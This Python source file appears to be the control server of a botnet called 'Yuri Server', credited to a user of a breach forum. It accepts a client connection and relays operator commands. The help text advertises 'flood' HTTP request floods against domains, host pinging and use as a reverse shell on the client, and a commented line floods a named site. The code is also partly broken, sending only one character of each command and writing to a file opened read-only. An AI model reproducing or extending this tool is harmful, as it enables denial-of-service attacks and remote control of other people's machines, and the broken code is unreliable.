import socket
import os
import random
import asyncio
import threading
import colorama
from colorama import Fore

from signal import signal, SIGPIPE, SIG_DFL  
signal(SIGPIPE,SIG_DFL)

greetings_n = random.randint(1, 3)
if int(greetings_n) == 1:
    print(Fore.RED + " ______   _____ ______   _____    ___________        ____________   ")

    print(Fore.RED + "|\     \ |     |\     \  \    \   \          \      /            \  ")

    print(Fore.RED + "\ \     \|     | \    |  |    |    \    /\    \    |\___/\  \\___/| ")
    print(Fore.RED + "\ \           |  |   |  |    |     |   \_\    |    \|____\  \___|/ ")
    print(Fore.RED + "\ \____      |  |    \_/   /|     |      ___/           |  |      ")
    print(Fore.RED + "\|___/     /|  |\         \|     |      \  ____   __  /   / __  ")
    print(Fore.RED + "   /     / |  | \         \__  /     /\ \/    \ /  \/   /_/  |  ")
    print(Fore.RED + " /_____/  /   \ \_____/\    \/_____/ |\______||____________/|  ")
    print(Fore.RED + "|     | /     \ |    |/___/||     | | |     ||           | /  ")
    print(Fore.RED + "|_____|/       \|____|   | ||_____|/ \|_____||___________|/   ")
    print(Fore.RED + "                   |___|/                                  ")
elif int(greetings_n) == 2:
    print(Fore.BLUE + " __  __     __  __     ______     __     ")
    print(Fore.BLUE + "/\ \_\ \   /\ \/\ \   /\  == \   /\ \    ")
    print(Fore.BLUE + "\ \____ \  \ \ \_\ \  \ \  __<   \ \ \   ")
    print(Fore.BLUE + " \/\_____\  \ \_____\  \ \_\ \_\  \ \_\ ")
    print(Fore.BLUE + "  \/_____/   \/_____/   \/_/ /_/   \/_/  ")
elif int(greetings_n) == 3:
    print(Fore.GREEN + "                    ___           ___                   ")
    print(Fore.GREEN + "      __           /  /\         /  /\           ___    ")
    print(Fore.GREEN + "     |  |\        /  /:/        /  /::\         /__/\   ")
    print(Fore.GREEN + "     |  |:|      /  /:/        /  /:/\:\        \__\:\  ")
    print(Fore.GREEN + "     |  |:|     /  /:/        /  /::\ \:\       /  /::\ ")
    print(Fore.GREEN + "     |__|:|__  /__/:/     /\ /__/:/\:\_\:\   __/  /:/\/ ")
    print(Fore.GREEN + "     /  /::::\ \  \:\    /:/ \__\/~|::\/:/  /__/\/:/~~  ")
    print(Fore.GREEN + "    /  /:/~~~~  \  \:\  /:/     |  |:|::/   \  \::/     ")
    print(Fore.GREEN + "   /__/:/        \  \:\/:/      |  |:|\/     \  \:\     ")
    print(Fore.GREEN + "   \__\/          \  \::/       |__|:|~       \__\/     ")
    print(Fore.GREEN + "                   \__\/         \__\|                  ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

hostname = socket.gethostname()
hostip = socket.gethostbyname(str(hostname))
port = 27035
try:
    s.bind((hostip, port))
except:
    print("[ERROR] Couldn't bind ip/port, IP/PORT is out of range or already in use!")
    exit(0)
s.listen(500)
print(f"listening on {hostip}:{port}")
print("")

class server:
    def __init__(self):
        self.stop_threads = False
    def start(self):
        print("TYPE 'help' TO START!")
        self.listen_thread = threading.Thread(target=self.listen)
        self.listen_thread.start()
        self.command_thread = threading.Thread(target=self.command)
        self.command_thread.start()
    def listen(self):
        
        #print(1)
        global c, addr
        c, addr = s.accept()
        
        print("[LOGS]: READY")
        
        while True:
            
            if self.stop_threads:
                print("DEBUG 1")
                break
            
            print(f"\n[LOGS]: Connection from {addr}")
            #current_dir_cont = os.listdir()
            #if str(f"{addr}.ydata") in current_dir_cont:
             #   number_id = random.randint(-5000000, 5000000)
              #  os.rename(str(f"{addr}.ydata"), str(f"{addr}{str(number_id)}.ydata"))
            #with open(f"{addr}.ydata", "w+") as log:
             #   logdata = s.recv(2048).decode()
              #  log.write(str(logdata))
               # log.close()
           # res = s.recv(2048).decode()
           # print(res)
          #  command = input("[YURI-SERVER]: command->")
            #time.sleep(2)
            #s.close()
            #s.send("flood http://minexware.cc/".encode())
    async def logs(self):
        resp = s.recv(20480).decode()
        print(Fore.GREEN + resp)
        with open("logs.txt", "r") as lgs:
            data = lgs.read()
            lgs.close()
        with open("logs.txt", "r") as logs:
            logs.write(data + f"{c}" + resp + "\n")
            logs.close()
            
    def command(self):
        while True:
            
            if self.stop_threads:
                print("DEBUG 2")
                break
            comm = input("[YURI-SHELL]: ").lower()
            if comm.strip(" ") == "":
                print("[ERROR]: No command supplied, skipping")
            elif comm == "exit":
                try:
                    s.close()
                    print("connections closed")
                except:
                    print("Failed to stop sockets")
                print("[LOGS]: Stopping Threads")
                self.stop_threads = True
                
                print("[LOGS]: Closing...")
                #raise KeyboardInterrupt
                
                
                exit(0)
            elif comm == "info":
                print("Yuri Server")
                print("Release: 1.0.5")
                print("Made by https://breached.vc/User-Minex")
            elif comm == "health":
                
                print(f"\n[LISTENING-THREAD]: {self.listen_thread.is_alive()}")
                print(f"[SHELL-THREAD]: {self.command_thread.is_alive()}\n")
            elif comm == "help":
                print("\n###SERVER COMMANDS###")
                print("info ##prints info about this program")
                print("health ##prints thread's health(running or not)")
                print("\n\n###CLIENT COMMANDS###")
                print("ping <ip> <port> <loops> ##pings a desired ip on a desired port, repeats for custom number of times")
                print("flood <http://domain.com> <duration> ##basic request flood on http domains\n")
                print("ANYTHING ELSE YOU TYPE WILL BE SENT TO THE CLIENT AS A COMMAND, YOU CAN USE IT AS REVERSE SHELL!")
            else:
            
                print("[LOGS]: Sending command to clients")
                c.sendall(str(comm[1]).encode())
                print("[LOGS]: Sent command to clients")
           #     continue
                #print("[ERROR]: Couldn't send command")
            
            
def keyboardi():
    try:
        1-1
    except KeyboardInterrupt:
        print("exiting")
        exit(0)
server().start()
#interrupt = threading.Thread(target=keyboardi)
#interrupt.start()
'''
listen_thread = threading.Thread(target=listen)
listen_thread.start()
command_thread = threading.Thread(target=command)
command_thread.start()'''

'''Shit didn't work, switched to threading'''
#asyncio.run(listen())
#asyncio.run(command())
#asyncio.run(logs())
